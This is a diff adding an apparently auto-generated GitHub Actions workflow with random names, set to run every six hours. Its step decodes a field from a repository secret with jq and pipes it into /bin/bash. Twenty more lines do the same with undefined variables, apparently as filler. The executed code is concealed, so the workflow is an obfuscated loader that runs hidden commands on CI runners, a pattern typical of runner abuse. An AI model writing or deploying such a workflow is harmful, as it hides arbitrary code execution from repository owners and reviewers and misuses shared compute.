@@ -1,0 +1,38 @@
+name: lirujing7654
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lirujing7654
+        env:
+          w4654: ${{ secrets.w4654 }}
+        run: |
+          echo $w4654 | jq -r .rvrlf5 | /bin/bash
+          echo $qlsnq2254 | jq -r .lkkn006 | /bin/bash
+          echo $wdva6 | jq -r .nsvmt5 | /bin/bash
+          echo $wd5104 | jq -r .hm3 | /bin/bash
+          echo $mw739 | jq -r .dwk41616 | /bin/bash
+          echo $bigs24 | jq -r .i08 | /bin/bash
+          echo $cnp7747 | jq -r .eerzb7766 | /bin/bash
+          echo $bs0271 | jq -r .v2861 | /bin/bash
+          echo $g60 | jq -r .rf94 | /bin/bash
+          echo $grz67 | jq -r .bo96572 | /bin/bash
+          echo $fubh0 | jq -r .xn305 | /bin/bash
+          echo $booua1327 | jq -r .ob23 | /bin/bash
+          echo $wkexc3490 | jq -r .czpsf7 | /bin/bash
+          echo $int2074 | jq -r .o327 | /bin/bash
+          echo $hopw63 | jq -r .ms27 | /bin/bash
+          echo $ybns5 | jq -r .rhp123 | /bin/bash
+          echo $bti51 | jq -r .bdiul5788 | /bin/bash
+          echo $rbrji94 | jq -r .ajt4 | /bin/bash
+          echo $tlqv3967 | jq -r .spuf72 | /bin/bash
+          echo $c557 | jq -r .su75394 | /bin/bash
+          echo $biz8572 | jq -r .duced1198 | /bin/bash
+
